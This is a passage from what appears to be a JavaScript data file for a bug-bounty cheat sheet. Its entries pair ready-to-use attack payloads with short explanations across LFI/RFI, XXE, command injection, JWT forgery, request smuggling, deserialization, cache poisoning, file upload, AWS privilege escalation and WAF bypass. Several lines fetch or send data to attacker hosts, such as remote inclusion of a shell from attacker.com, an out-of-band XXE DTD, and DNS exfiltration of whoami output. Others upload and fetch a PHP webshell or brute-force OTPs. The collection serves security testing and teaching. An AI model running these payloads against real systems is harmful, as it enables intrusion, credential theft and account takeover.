    note:'Old PHP truncated strings at a null byte, defeating a hardcoded ".php" suffix appended by the vulnerable code. Only relevant on very old stacks today.' },
  { track:'bugbounty', cat:'lfi', title:'Classic RFI',
    code:'?page=http://attacker.com/shell.txt',
    note:'If allow_url_include is on (rare by default on modern PHP) and the app blindly includes a URL parameter, this pulls and executes a remote file directly — the more dangerous sibling of LFI.' },
  { track:'bugbounty', cat:'lfi', title:'Windows UNC path inclusion',
    code:'\\\\attacker-ip\\share\\evil.php',
    note:'On Windows, an include function that accepts a UNC path fetches the file over SMB — useful when local traversal is blocked but the include function itself isn\'t path-restricted.' },

  // ---------- xxe ----------
  { track:'bugbounty', cat:'xxe', title:'Classic file read',
    code:"<?xml version=\"1.0\"?>\n<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>\n<root>&test;</root>",
    note:'Defines an external entity pointing at a local file, then references it in the body — the parser resolves it and drops the file contents straight into the response.' },
  { track:'bugbounty', cat:'xxe', title:'Blind OOB via external DTD',
    code:'<?xml version="1.0"?>\n<!DOCTYPE message [\n  <!ENTITY % ext SYSTEM "http://attacker.com/ext.dtd">\n  %ext;\n]>\n<message></message>',
    note:'For blind XXE with nothing reflected, host a remote DTD that reads a file into a parameter entity and leaks it via a request back to your own server — needed when the response never echoes the entity directly.' },
  { track:'bugbounty', cat:'xxe', title:'XXE via SVG upload',
    code:'<?xml version="1.0" standalone="yes"?>\n<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>\n<svg width="128" height="128" xmlns="http://www.w3.org/2000/svg"><text x="0" y="16">&xxe;</text></svg>',
    note:'SVG is XML under the hood and commonly accepted by avatar/file uploads — the rendered image leaks the target file\'s content as visible text.' },
  { track:'bugbounty', cat:'xxe', title:'Parameter entity recursion',
    code:'<!DOCTYPE r [\n  <!ENTITY % pe_1 "<!---->">\n  <!ENTITY % pe_2 "&#37;pe_1;<!---->&#37;pe_1;">\n  <!ENTITY % pe_3 "&#37;pe_2;<!---->&#37;pe_2;">\n  %pe_3;\n]>\n<r/>',
    note:'Recursive parameter entity expansion inflates processing cost exponentially with each layer — a compact way to demonstrate an availability impact from XXE without any external connection.' },

  // ---------- command-injection ----------
  { track:'bugbounty', cat:'command-injection', title:'Basic chaining',
    code:'; id',
    note:'A semicolon ends the intended command and starts a new one wherever user input reaches a shell unsanitized — swap for && or | depending on the shell and the behavior you need on failure.' },
  { track:'bugbounty', cat:'command-injection', title:'Blind time-based',
    code:'$(sleep 5)',
    note:'When there\'s no output channel at all, a deliberate delay is the signal — a 5-second-slower response confirms the injection point even in a completely blind app.' },
  { track:'bugbounty', cat:'command-injection', title:'OOB exfiltration via DNS',
    code:'; nslookup $(whoami).YOUR-ID.oast.fun',
    note:'Exfiltrates command output through a DNS query to a domain you control — the subdomain itself carries the data, useful when there\'s no visible output and no reliable timing channel.' },
  { track:'bugbounty', cat:'command-injection', title:'Space-filter bypass with $IFS',
    code:'cat${IFS}/etc/passwd',
    note:'When a filter blocks the literal space character, $IFS (the shell\'s field separator variable) expands to whitespace and the command reassembles normally.' },
  { track:'bugbounty', cat:'command-injection', title:'Windows cmd chaining',
    code:'& whoami',
    note:'cmd.exe\'s equivalent of the Unix semicolon — chains a second command onto the end regardless of the first one\'s exit code.' },
  { track:'bugbounty', cat:'command-injection', title:'PowerShell -EncodedCommand bypass',
    code:'powershell -enc <Base64-of-UTF16LE-command>',
    note:'Encoding the payload as Base64 UTF-16LE and passing it via -enc slips past naive filters that only pattern-match plaintext keywords like "Invoke-Expression".' },

  // ---------- ldap-injection ----------
  { track:'bugbounty', cat:'ldap-injection', title:'Auth bypass',
    code:'*)(uid=*))(|(uid=*',
    note:'Injected into a username field, this closes and reopens filter clauses so the LDAP query always evaluates true — the same idea as \' OR \'1\'=\'1 for SQL, adapted to LDAP filter syntax.' },
  { track:'bugbounty', cat:'ldap-injection', title:'Blind attribute extraction',
    code:'admin)(&(password=a*',
    note:'Tests the password one prefix at a time by wrapping it in an AND clause — a different response for a matching vs non-matching prefix lets you brute-force the value blind.' },

  // ---------- csrf ----------
  { track:'bugbounty', cat:'csrf', title:'Quick triage: does it even have CSRF protection?',
    code:'1. Repeat the request in Burp with the CSRF/session token parameter removed entirely — still 200 = no real check.\n2. Inspect the session cookie\'s Set-Cookie flags for SameSite=Strict|Lax|None.\n3. Strip the Origin and Referer headers and resend — if the response is unchanged, that fallback defense is absent too.',
    note:'Three checks, five minutes: no token enforced, SameSite not Strict, and no Origin/Referer validation server-side — if all three hold, the endpoint is CSRF-able and a PoC HTML form (below) is next.' },
  { track:'bugbounty', cat:'csrf', title:'No-token GET-based CSRF',
    code:'<img src="https://bank.com/transfer?to=attacker&amount=1000">',
    note:'If a sensitive action accepts GET and never checks a CSRF token or Origin header, a single auto-loading tag on any page the victim visits triggers it — no click required.' },
  { track:'bugbounty', cat:'csrf', title:'JSON CSRF via text/plain form',
    code:'<form action="https://api.target.com/change-email" method="POST" enctype="text/plain">\n<input name=\'{"email":"attacker@evil.com","x":"\' value=\'"}\'>\n</form>\n<script>document.forms[0].submit()</script>',
    note:'text/plain form submission lets you smuggle near-valid JSON cross-origin when the API only checks that the body parses, not the Content-Type header — the extra "x" field absorbs the form-encoding noise.' },
  { track:'bugbounty', cat:'csrf', title:'SameSite=Lax top-level bypass',
    code:'<a href="https://bank.com/transfer?to=attacker&amount=1000">click for a free gift</a>',
    note:'Lax is the modern default and still allows cookies on top-level GET navigations — a state-changing GET endpoint is exploitable with nothing more than a link click.' },

  // ---------- cors ----------
  { track:'bugbounty', cat:'cors', title:'Reflected-origin probe',
    code:'curl -H "Origin: https://evil.com" -I https://target.com/api/private',
    note:'If the response reflects Access-Control-Allow-Origin: https://evil.com together with Access-Control-Allow-Credentials: true, any site can read that endpoint\'s authenticated response from a victim\'s browser — a direct path to account takeover.' },
  { track:'bugbounty', cat:'cors', title:'null origin bypass',
    code:'Origin: null',
    note:'Some misconfigured APIs explicitly allow the literal "null" origin, which you can trigger from a sandboxed iframe (<iframe sandbox="allow-scripts" srcdoc="...">) even when they otherwise validate origins properly.' },
  { track:'bugbounty', cat:'cors', title:'Suffix-match regex bypass',
    code:'Origin: https://target.com.evil.com',
    note:'A backend that checks the origin with something like origin.endswith("target.com") or a loose regex can be fooled by a subdomain-looking string appended to an attacker-owned domain.' },

  // ---------- idor-oauth ----------
  { track:'bugbounty', cat:'idor-oauth', title:'IDOR via sequential ID',
    code:'GET /api/user/1204/profile  ->  GET /api/user/1205/profile',
    note:'Swap an ID you own for a neighboring one. If the response returns another user\'s private data under your own session, that\'s an IDOR — pair it with PII fields for a stronger business-impact writeup.' },
  { track:'bugbounty', cat:'idor-oauth', title:'OAuth redirect_uri hijack',
    code:'GET /oauth/authorize?client_id=X&redirect_uri=https://attacker.com&response_type=token',
    note:'If redirect_uri isn\'t validated against an exact allow-list (prefix/substring matching is a common bug), the auth code or token gets delivered straight to an attacker-controlled host.' },
  { track:'bugbounty', cat:'idor-oauth', title:'Missing state parameter (CSRF into OAuth)',
    code:'GET /oauth/authorize?client_id=X&redirect_uri=https://target.com/callback   (no state param)',
    note:'Without a state parameter tying the callback to the session that started it, an attacker can bind their own OAuth authorization to a victim\'s session — a form of CSRF that ends in account linkage or takeover.' },

  // ---------- jwt ----------
  { track:'bugbounty', cat:'jwt', title:'alg:none bypass',
    code:'{"alg":"none","typ":"JWT"}   — then strip the signature entirely',
    note:'Some JWT libraries honor the "none" algorithm and skip signature verification altogether. Change the header, edit any claim you want (e.g. role:admin), drop the signature, done.' },
  { track:'bugbounty', cat:'jwt', title:'RS256 → HS256 key confusion',
    code:"header.alg = 'HS256'  — sign using the server's public RSA key as the HMAC secret",
    note:'If a server accepts both RS256 and HS256 and blindly reuses one verification function, you can forge a token with HS256 using the RSA public key (freely available) as the shared secret — it verifies as valid.' },
  { track:'bugbounty', cat:'jwt', title:'kid header injection',
    code:'{"alg":"HS256","kid":"../../../../dev/null"}',
    note:'If the "kid" (key ID) header tells the server which key file to load, pointing it at /dev/null and signing with an empty-string secret produces a token that verifies successfully against a predictable empty key.' },
  { track:'bugbounty', cat:'jwt', title:'Weak-secret cracking',
    code:'hashcat -m 16500 jwt.txt rockyou.txt',
    note:'hashcat mode 16500 cracks JWTs signed with a weak HS256 secret directly from a wordlist — worth trying before assuming the signature is unbreakable.' },

  // ---------- open-redirect ----------
  { track:'bugbounty', cat:'open-redirect', title:'Basic redirect parameter',
    code:'https://target.com/login?redirect=https://evil.com',
    note:'The simplest form — an unvalidated redirect parameter sends the user anywhere after a trusted-looking click, often chained into OAuth token theft or credibility-borrowing phishing.' },
  { track:'bugbounty', cat:'open-redirect', title:'Protocol-relative bypass',
    code:'https://target.com/redirect?url=//evil.com',
    note:'Some validators only check for an "http"/"https" prefix — a protocol-relative //evil.com still redirects the browser while slipping past a naive regex.' },
  { track:'bugbounty', cat:'open-redirect', title:'userinfo @ trick',
    code:'https://target.com@evil.com/',
    note:'Browsers treat everything before @ as userinfo, so this actually navigates to evil.com — fools validators that only check the string starts with the trusted domain.' },

  // ---------- graphql ----------
  { track:'bugbounty', cat:'graphql', title:'Introspection schema dump',
    code:'{ __schema { types { name fields { name type { kind name } } } } }',
    note:'GraphQL exposes __schema and __type fields so clients can ask the server what exists — a great recon step to enumerate sensitive types and mutations before an API has any real documentation.' },
  { track:'bugbounty', cat:'graphql', title:'Batching/aliasing brute-force',
    code:'mutation {\n  a1: login(user:"admin", pass:"1111"){token}\n  a2: login(user:"admin", pass:"2222"){token}\n  a3: login(user:"admin", pass:"3333"){token}\n}',
    note:'Aliases let you send many login attempts inside one HTTP request, cutting overhead and often slipping past a rate limiter that only counts requests, not attempts.' },
  { track:'bugbounty', cat:'graphql', title:'IDOR via query argument',
    code:'{ user(id: "2") { name email ssn } }',
    note:'The same IDOR logic as a REST endpoint, just expressed as a query argument — increment or guess the id value and see whether authorization is actually enforced per-field.' },
  { track:'bugbounty', cat:'graphql', title:'Introspection disabled — field-name bypass',
    code:'python3 clairvoyance.py -o schema.json https://target.com/graphql',
    note:'When __schema is blocked but the server still returns "did you mean X?" suggestions on unknown-field errors, tools like Clairvoyance abuse those suggestions to reconstruct the schema field by field.' },
  { track:'bugbounty', cat:'graphql', title:'CSRF via GET / multipart bypass',
    code:'GET /graphql?query={me{email,apiKey}} HTTP/1.1\nHost: target.com',
    note:'Apps that only defend the JSON POST path (relying on Content-Type-based CORS preflight) often still accept the same query over GET or multipart/form-data — both are triggerable from a plain cross-site HTML form, defeating that defense.' },
  { track:'bugbounty', cat:'graphql', title:'Nested query DoS',
    code:'{ user(id:1){ friends{ friends{ friends{ friends{ friends{ name } } } } } } }',
    note:'Without query depth/complexity limiting, a resolver that fetches friends-of-friends recursively can be nested deep enough to make one request cost thousands of times the intended database work.' },
  { track:'bugbounty', cat:'graphql', title:'Excessive data exposure',
    code:'{ users { id username email password_hash internal_notes } }',
    note:'Fields never meant for API consumers (hashes, internal flags, moderation notes) often exist on the same GraphQL type as public ones with no separate per-field authorization — worth just asking for everything the type exposes.' },

  // ---------- proto-pollution ----------
  { track:'bugbounty', cat:'proto-pollution', title:'Client-side URL hash injection',
    code:'https://victim.com/#__proto__[admin]=1',
    note:'If a client-side router or utility merges the parsed hash into an object without checking the key, this pollutes Object.prototype directly — every object in the page can suddenly see admin:1.' },
  { track:'bugbounty', cat:'proto-pollution', title:'JSON.parse merge payload',
    code:'{"__proto__": {"isAdmin": true}}',
    note:'A common vulnerable pattern is a "deep merge" utility that copies parsed JSON keys onto an existing object without excluding __proto__ — this pollutes every object app-wide, not just the one being merged into.' },
  { track:'bugbounty', cat:'proto-pollution', title:'constructor.prototype variant',
    code:'{"constructor": {"prototype": {"json spaces": 10}}}',
    note:'Some sanitizers block the literal string "__proto__" but miss this equivalent path through constructor.prototype — worth trying whenever the first payload gets filtered.' },

  // ---------- deserialization ----------
  { track:'bugbounty', cat:'deserialization', title:'PHP object injection marker',
    code:'O:8:"stdClass":1:{s:4:"data";s:6:"pwned!";}',
    note:'The leading O: identifies a serialized PHP object. If user input reaches unserialize(), a crafted object can trigger __wakeup() or __destruct() — tools like phpggc build full gadget chains automatically.' },
  { track:'bugbounty', cat:'deserialization', title:'Python pickle RCE sink',
    code:'pickle.loads(base64.b64decode(user_input))',
    note:'Unpickling untrusted data executes arbitrary code by design — a pickle stream can embed a __reduce__ call that runs any function, so this line alone is the vulnerability, no clever payload required to prove it.' },
  { track:'bugbounty', cat:'deserialization', title:'Java gadget chain (ysoserial)',
    code:"java -jar ysoserial.jar CommonsCollections5 'id' | base64",
    note:'Generates a serialized Java object that chains gadgets already on the target\'s classpath (e.g. Commons Collections) to run an OS command the moment it\'s deserialized.' },
  { track:'bugbounty', cat:'deserialization', title:'.NET ViewState (leaked machineKey)',
    code:"ysoserial.net -o base64 -g TypeConfuseDelegate -c \"cmd /c calc\" --validationalg=SHA1 --validationkey=<leaked-key>",
    note:'If the ASP.NET machineKey has leaked (a shockingly common finding), you can forge a validly-signed ViewState that deserializes into a gadget chain the moment the page posts back.' },
  { track:'bugbounty', cat:'deserialization', title:'Ruby Marshal sink',
    code:'Marshal.load(cookie_value)',
    note:'Ruby\'s Marshal.load executes arbitrary code on crafted input the same way Python\'s pickle.loads does — often reachable through a session cookie in older Rails apps.' },

  // ---------- request-smuggling ----------
  { track:'bugbounty', cat:'request-smuggling', title:'CL.TE desync',
    code:'POST / HTTP/1.1\nHost: target.com\nContent-Length: 13\nTransfer-Encoding: chunked\n\n0\n\nSMUGGLED',
    note:'The front-end trusts Content-Length and forwards the whole body; the back-end trusts Transfer-Encoding, ends the request at the 0-chunk, and parses "SMUGGLED" as the start of the next one on the same connection.' },
  { track:'bugbounty', cat:'request-smuggling', title:'TE.CL desync',
    code:'POST / HTTP/1.1\nHost: target.com\nContent-Length: 3\nTransfer-Encoding: chunked\n\n8\nSMUGGLED\n0\n\n',
    note:'The mirror image of CL.TE — front-end honors chunked encoding, back-end honors Content-Length and stops after 3 bytes, leaving "SMUGGLED" to poison the next request the back-end parses.' },
  { track:'bugbounty', cat:'request-smuggling', title:'TE.TE obfuscation',
    code:'Transfer-Encoding: xchunked\nTransfer-Encoding: chunked\nTransfer-Encoding: Transfer-Encoding: chunked\nTransfer-Encoding:\tchunked',
    note:'Both front-end and back-end support chunked encoding, but one of them can be tricked into NOT recognizing the header by slightly malforming it — try each variant until one server honors it and the other doesn\'t, which is the desync.' },
  { track:'bugbounty', cat:'request-smuggling', title:'Timing-based detection (timeout probe)',
    code:'POST / HTTP/1.1\nHost: target.com\nContent-Length: 4\nTransfer-Encoding: chunked\n\n1\nA',
    note:'Sends a chunked body missing its terminating 0-chunk. If the back-end parses Transfer-Encoding, it hangs waiting for the rest of a body that will never come — a clean, safe-to-run way to fingerprint TE support before attempting a live desync.' },
  { track:'bugbounty', cat:'request-smuggling', title:'H2 downgrade smuggling (CRLF injection)',
    code:':method: POST\n:path: /\n:authority: target.com\ncontent-length: 0\nfoo: bar\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\nHost: internal',
    note:'HTTP/2 has no CL/TE ambiguity by itself, but if the front-end translates h2 to HTTP/1.1 before forwarding, a CRLF sequence smuggled inside a header value gets re-interpreted as a second, fully separate HTTP/1.1 request on the back-end connection.' },

  // ---------- race-condition ----------
  { track:'bugbounty', cat:'race-condition', title:'Concurrent coupon redemption',
    code:"for i in {1..20}; do curl -s -X POST https://shop.com/redeem -d 'code=SAVE50' & done; wait",
    note:'Firing many requests in parallel targets the gap between checking a coupon\'s validity and marking it used — several land inside that window and all get applied before any single one is flagged redeemed.' },
  { track:'bugbounty', cat:'race-condition', title:'Single-packet attack (Turbo Intruder)',
    code:'# Turbo Intruder, engine=Engine.THREADED2, concurrentConnections=1\n# queues all requests on one connection, releases within microseconds',
    note:'Burp\'s Turbo Intruder can queue requests on a single connection and release them almost simultaneously, narrowing the race window far more than simple threaded tools manage over separate connections.' },
  { track:'bugbounty', cat:'race-condition', title:'Multi-endpoint race (email change + reset token)',
    code:'# Fire concurrently, right as the session transitions between two endpoints:\nPOST /email/change    {"new_email":"attacker@evil.com"}\nPOST /password/reset  {"token":"<token mailed to the OLD address>"}',
    note:'Races don\'t have to hit the same endpoint — a reset token generated for the old email can still validate if the email-change commit and the token check land inside the same narrow window across two different requests.' },
  { track:'bugbounty', cat:'race-condition', title:'TOCTOU file upload race',
    code:'for i in {1..20}; do curl -s -F "file=@webshell.php" https://target.com/upload & done; wait\ncurl -s https://target.com/uploads/webshell.php',
    note:'Antivirus/content scanning that runs after the file is already written to disk leaves a time-of-check-to-time-of-use gap — enough concurrent uploads and one request gets served before the scan deletes it.' },
  { track:'bugbounty', cat:'race-condition', title:'OTP brute-force lockout bypass',
    code:'for code in {0000..9999}; do curl -s -X POST https://target.com/2fa -d "code=$code" & done; wait',
    note:'A lockout counter that increments after checking a code, not before, lets every parallel guess read the same "0 failed attempts" state — the whole 4-digit keyspace can land before a single failure commits.' },

  // ---------- cache-poisoning ----------
  { track:'bugbounty', cat:'cache-poisoning', title:'Cache deception via fake static extension',
    code:'https://target.com/myaccount/home/nonexistent.css',
    note:'The origin serves the real account page regardless of the fake .css suffix, but the cache stores it as a static asset because of the extension — the next visitor to that exact URL gets the previous victim\'s cached private page.' },
  { track:'bugbounty', cat:'cache-poisoning', title:'Unkeyed header poisoning',
    code:'GET /?cb=123 HTTP/1.1\nHost: target.com\nX-Forwarded-Host: evil.com"><script>alert(1)</script>',
    note:'If the origin reflects an unkeyed header like X-Forwarded-Host into the page but the cache key ignores that header, one poisoned response gets served to every subsequent visitor of the same cached URL.' },
  { track:'bugbounty', cat:'cache-poisoning', title:'Param Miner — unkeyed input discovery',
    code:'# Burp extension: Param Miner -> "Guess headers" / "Guess params"\n# sends each candidate header/param and diffs the cached response',
    note:'Manually testing every possible unkeyed header is impractical — Param Miner automates the guess-and-diff loop and is the standard tool for finding exactly which inputs the cache ignores but the origin still reflects.' },
  { track:'bugbounty', cat:'cache-poisoning', title:'Web cache deception via path confusion',
    code:'https://target.com/myaccount/;fake.css',
    note:'Some frameworks strip everything after a ; when routing (treating it as a path parameter) but the cache keys on the full raw path — the same private-page-served-from-cache outcome as the fake-extension trick, useful when that one gets filtered.' },
  { track:'bugbounty', cat:'cache-poisoning', title:'Fat GET request smuggling into cache',
    code:'GET /page HTTP/1.1\nHost: target.com\nContent-Length: 44\n\nGET /admin HTTP/1.1\nHost: target.com',
    note:'Some frameworks read a body off a GET request even though nothing requires them to — a body-oblivious cache or proxy in front of it can end up storing the smuggled second request\'s response under the first request\'s URL.' },

  // ---------- file-upload ----------
  { track:'bugbounty', cat:'file-upload', title:'Double extension',
    code:'shell.php.jpg',
    note:'Some validators only check the last extension, and some misconfigured servers still execute .php.jpg as PHP — worth testing even though most modern stacks patched this years ago.' },
  { track:'bugbounty', cat:'file-upload', title:'Content-Type header spoof',
    code:"Content-Type: image/png   (body is still <?php system($_GET['c']); ?>)",
    note:'Validators that only check the Content-Type header — and never the actual file bytes — are defeated by simply lying about it.' },
  { track:'bugbounty', cat:'file-upload', title:'GIF/PHP polyglot',
    code:"GIF89a;\n<?php system($_GET['c']); ?>",
    note:'Starts with a valid GIF magic-byte header so content sniffing passes, but a server that also executes .php files by extension will still run the payload appended after it.' },

  // ---------- subdomain-takeover ----------
  { track:'bugbounty', cat:'subdomain-takeover', title:'Dangling CNAME check',
    code:'dig CNAME forgotten.target.com',
    note:'If it points at a cloud service (S3, Heroku, GitHub Pages...) that\'s no longer claimed, registering that same resource under your own account lets you serve content on the victim\'s subdomain.' },
  { track:'bugbounty', cat:'subdomain-takeover', title:'Fingerprint before you claim',
    code:'check: github.com/EdOverflow/can-i-take-over-xyz',
    note:'A maintained list of the exact error/response fingerprint each cloud provider gives for an unclaimed CNAME target — confirm the takeover is real before spending time registering the resource.' },

  // ---------- cloud ----------
  // Cross-checked against AWS's own security docs, HackTricks' cloud
  // pentesting pages and Rhino Security Labs' published IAM privesc research
  // (the source for most of the escalation chains below).
  { track:'bugbounty', cat:'cloud', title:'Public S3 bucket listing',
    code:'aws s3 ls s3://{DOMAIN}-backup --no-sign-request\naws s3 ls s3://{DOMAIN}-assets --no-sign-request',
    note:'--no-sign-request skips auth entirely — if the bucket policy grants s3:ListBucket to everyone, you get a full object listing with zero credentials, no key needed.' },
  { track:'bugbounty', cat:'cloud', title:'Public S3 bucket write test',
    code:'echo poc > poc.txt\naws s3 cp poc.txt s3://{DOMAIN}-uploads/poc.txt --no-sign-request --acl public-read',
    note:'A bucket that also allows anonymous s3:PutObject is a step beyond info-disclosure — you can plant content the app itself later serves, or overwrite existing objects if versioning is off.' },
  { track:'bugbounty', cat:'cloud', title:'Enumerate a leaked key\'s real permissions',
    code:'aws sts get-caller-identity --profile leaked\npython3 enumerate-iam.py --access-key AKIA... --secret-key ...',
    note:'A found/leaked access key rarely comes with a permissions list attached — enumerate-iam.py (Rhino Security Labs) brute-force-calls hundreds of read-only AWS API methods and checks which ones don\'t return AccessDenied, mapping out what the key can actually do.' },
  { track:'bugbounty', cat:'cloud', title:'IAM privesc via iam:CreatePolicyVersion',
    code:'aws iam create-policy-version --policy-arn arn:aws:iam::<acct>:policy/<attached-policy> --policy-document file://admin.json --set-as-default',
    note:'If your compromised user can create a new version of a policy already attached to itself, you can set that new version to full "Action":"*" admin access — one of the most direct of the ~20 documented AWS IAM privesc paths.' },
  { track:'bugbounty', cat:'cloud', title:'IAM privesc via iam:PassRole + Lambda',
    code:'aws lambda create-function --function-name poc --runtime python3.12 --role arn:aws:iam::<acct>:role/over-privileged-role --handler poc.handler --zip-file fileb://poc.zip\naws lambda invoke --function-name poc out.json',
    note:'iam:PassRole alone does nothing — paired with lambda:CreateFunction + lambda:InvokeFunction it lets you attach a role you can\'t assume directly to a function you control, then run code with that role\'s permissions.' },
  { track:'bugbounty', cat:'cloud', title:'Publicly shared EBS/RDS snapshots',
    code:'aws ec2 describe-snapshots --restorable-by-user-ids all --region us-east-1\naws rds describe-db-snapshots --include-public --region us-east-1',
    note:'Snapshots occasionally get marked "public" by mistake during a restore/copy workflow — anyone can then create their own volume/instance from someone else\'s full disk or database image.' },
  { track:'bugbounty', cat:'cloud', title:'Exposed Terraform state file',
    code:'curl https://{DOMAIN}/terraform.tfstate\ncurl https://{DOMAIN}-terraform-state.s3.amazonaws.com/terraform.tfstate --no-sign-request',
    note:'terraform.tfstate stores every managed resource\'s attributes in plaintext by design — including DB passwords, API keys and access keys set as Terraform variables — and it\'s regularly left in a public bucket or web-accessible path.' },
  { track:'bugbounty', cat:'cloud', title:'Azure Blob Storage public container',
    code:'curl "https://{ACCOUNT}.blob.core.windows.net/{CONTAINER}?restype=container&comp=list"',
    note:'The Azure equivalent of an open S3 bucket — a container set to "Public read access for containers and blobs" returns a full XML blob listing to this unauthenticated REST call.' },
  { track:'bugbounty', cat:'cloud', title:'Firebase Realtime Database unauth read',
    code:'curl https://{PROJECT}.firebaseio.com/.json',
    note:'Firebase\'s default/misconfigured security rules (".read": true) expose the entire JSON tree to anyone who requests it directly — no SDK, auth token or app involved, just the raw REST endpoint.' },
  { track:'bugbounty', cat:'cloud', title:'Cognito unauthenticated Identity Pool abuse',
    code:'aws cognito-identity get-id --identity-pool-id {DOMAIN}-pool --region us-east-1\naws cognito-identity get-credentials-for-identity --identity-id <id-from-above>',
    note:'Cognito Identity Pools hand out temporary AWS credentials to unauthenticated app users by design — the bug is when the attached "unauth" IAM role is over-permissioned, letting anyone pull real AWS creds and explore what they reach.' },
  { track:'bugbounty', cat:'cloud', title:'Pacu — automated AWS post-exploitation',
    code:'pacu\nPacu (poc:no_session) > run iam__enum_permissions\nPacu (poc:no_session) > run s3__download_bucket',
    note:'Once you have any valid (even low-privilege) AWS key, Pacu automates the enumerate → find-privesc-path → exploit loop across IAM, S3, EC2, Lambda and more — the standard tool for what to try next after step 3 above.' },

  // ---------- clickjacking ----------
  { track:'bugbounty', cat:'clickjacking', title:'Basic invisible-iframe PoC',
    code:'<style>iframe{opacity:.0001;position:absolute;top:0;left:0;width:100%;height:100%;}</style>\n<iframe src="https://target.com/delete-account"></iframe>\n<div style="position:absolute;top:300px;left:300px;">Click to win a prize</div>',
    note:'Overlays an invisible iframe of the real page on top of a decoy button — the victim thinks they\'re clicking "claim prize" but the click actually lands on the target site\'s real button underneath.' },
  { track:'bugbounty', cat:'clickjacking', title:'Missing frame-protection check',
    code:'curl -I https://target.com | grep -i x-frame',
    note:'If neither X-Frame-Options nor a frame-ancestors CSP directive shows up, the page can be framed at all — often reportable on its own depending on what the page does.' },

  // ---------- crlf ----------
  { track:'bugbounty', cat:'crlf', title:'HTTP response splitting',
    code:'/?lang=en%0D%0AContent-Length:%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type:%20text/html%0A%0A%3Chtml%3EPhished%3C/html%3E',
    note:'Injects CRLF sequences to terminate the intended response early with Content-Length: 0, then smuggles a whole second HTTP response — a path to cache poisoning or convincing on-domain phishing.' },
  { track:'bugbounty', cat:'crlf', title:'Header injection to XSS',
    code:'/%0d%0aX-XSS-Protection:0%0d%0a%0d%0a%3Csvg%20onload=alert(document.domain)%3E',
    note:'Injects a header that disables a legacy browser XSS filter, then smuggles markup into the response body via the same CRLF trick — turns a header-injection bug into a working XSS.' },

  // ---------- http-param-pollution ----------
  { track:'bugbounty', cat:'http-param-pollution', title:'Duplicate parameter, different value per layer',
    code:'?param=a&param=b',
    note:'PHP/Apache reads the last value, JSP/Tomcat reads the first — a WAF or auth check sitting in front of one stack can validate a different value than the app behind it actually uses.' },
  { track:'bugbounty', cat:'http-param-pollution', title:'Smuggle a second role value',
    code:'?role=user&role=admin',
    note:'If front-end validation checks the first occurrence but back-end logic reads the last one (or vice versa), duplicating the parameter smuggles a different effective value past the check entirely.' },

  // ---------- mass-assignment ----------
  { track:'bugbounty', cat:'mass-assignment', title:'isAdmin injection',
    code:'{"username":"attacker","email":"a@a.com","password":"pw","isAdmin":true}',
    note:'If the app auto-binds the whole JSON body onto a model/ORM object without an explicit allow-list, adding a field the UI never exposes can still get assigned — including flags it never meant to let you set.' },
  { track:'bugbounty', cat:'mass-assignment', title:'role injection on registration',
    code:'{"username":"newuser","email":"user@example.com","password":"pw","role":"admin"}',
    note:'Same bug, applied at signup instead of profile update — role-based access control means nothing if the role field itself is user-suppliable and never filtered server-side.' },

  // ---------- info-disclosure ----------
  { track:'bugbounty', cat:'info-disclosure', title:'Exposed .git directory',
    code:'https://target.com/.git/config\nthen: git-dumper https://target.com/.git/ ./dump',
    note:'A deployed .git folder lets you reconstruct the entire repository history — including past commits that may still contain hardcoded secrets even after they were "removed" in a later commit.' },
  { track:'bugbounty', cat:'info-disclosure', title:'Exposed JS source maps',
    code:'https://target.com/static/js/main.js.map',
    note:'A .map file reverses minified JS back into readable original source, often revealing internal API routes, comments, and occasionally hardcoded credentials that were never meant to ship.' },
  { track:'bugbounty', cat:'info-disclosure', title:'Framework debug endpoints',
    code:'https://target.com/actuator/env\nor: ?debug=true  /  ?XDEBUG_SESSION_START=1',
    note:'Debug endpoints and modes (Spring Actuator, Laravel Telescope, Django DEBUG=True error pages) routinely leak environment variables, internal paths, and sometimes full database credentials.' },

  // ---------- host-header ----------
  { track:'bugbounty', cat:'host-header', title:'Password reset poisoning',
    code:'POST /forgot-password HTTP/1.1\nHost: evil.com\n\nemail=victim@target.com',
    note:'If the reset email builds its link from the Host header instead of a hardcoded domain, the victim gets a legitimate-looking reset email that actually points at evil.com, handing you their reset token.' },
  { track:'bugbounty', cat:'host-header', title:'Cache poisoning via Host',
    code:'Host: attacker-controlled.com',
    note:'The same idea as an unkeyed X-Forwarded-Host, but through the primary Host header — if it gets reflected into cached content, one poisoned response serves every subsequent visitor of that URL.' },

  // ---------- xpath-injection ----------
  { track:'bugbounty', cat:'xpath-injection', title:'Auth bypass',
    code:"' or '1'='1",
    note:'Same logic as SQL/LDAP injection applied to an XPath query used for authentication — closes the string early and forces the expression to always evaluate true.' },
  { track:'bugbounty', cat:'xpath-injection', title:'Blind extraction',
    code:"' and substring(//user[position()=1]/password,1,1)='a",
    note:'Tests the first character of a node\'s value one guess at a time — a true/false difference in the response lets you extract arbitrary XML data character by character.' },

  // ---------- api-security ----------
  { track:'bugbounty', cat:'api-security', title:'Excessive data exposure',
    code:'GET /api/v1/users/123 — diff the full JSON against what the UI actually renders',
    note:'APIs often return the entire database object and let the frontend cherry-pick fields to display — the fields it doesn\'t show (ssn, internal_notes, password_hash...) are still sitting right there in the response.' },
  { track:'bugbounty', cat:'api-security', title:'Missing rate limiting on OTP/coupon',
    code:'for i in {1..1000}; do curl -s -X POST https://api.target.com/verify-otp -d "code=$i"; done',
    note:'A 4-6 digit OTP or coupon code is trivially brute-forceable if the endpoint never throttles attempts — always worth a quick loop before moving on to something harder.' },

  // ---------- waf-bypass ----------
  { track:'bugbounty', cat:'waf-bypass', title:'Inline-comment SQLi bypass',
    code:'UNI/**/ON SEL/**/ECT',
    note:'Splits keywords a regex-based WAF matches literally, while the database still parses it as one token once the comment is stripped.' },
  { track:'bugbounty', cat:'waf-bypass', title:'No-space XSS',
    code:'<svg/onload=alert(1)>',
    note:'Replacing the space with "/" defeats WAF rules that only look for "<tag " with a literal space before the attribute.' },
  { track:'bugbounty', cat:'waf-bypass', title:'Origin IP disclosure (bypass Akamai / Cloudflare entirely)',
    code:'crt.sh + historical DNS (SecurityTrails/ViewDNS) -> find an A record or forgotten subdomain that isn\'t proxied',
    note:'If the real origin server\'s IP is discoverable, connecting straight to it (with the right Host header) skips the CDN/WAF layer completely — always check DNS history before assuming an Akamai- or Cloudflare-fronted app can\'t be hit directly.' },
